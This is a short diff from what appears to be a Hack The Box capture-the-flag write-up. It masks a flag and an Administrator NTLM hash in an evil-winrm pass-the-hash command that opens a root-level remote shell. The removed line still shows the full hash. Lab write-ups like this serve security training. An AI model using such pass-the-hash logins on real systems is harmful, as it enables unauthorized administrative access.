@@ -123,7 +123,7 @@ de9e……cb29
 ## flag: root
 
 ```
-└─$ evil-winrm -i ${HTB_IP} -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
+└─$ evil-winrm -i ${HTB_IP} -u Administrator -H A52F…………F4EE
 
 Evil-WinRM shell v3.4
 
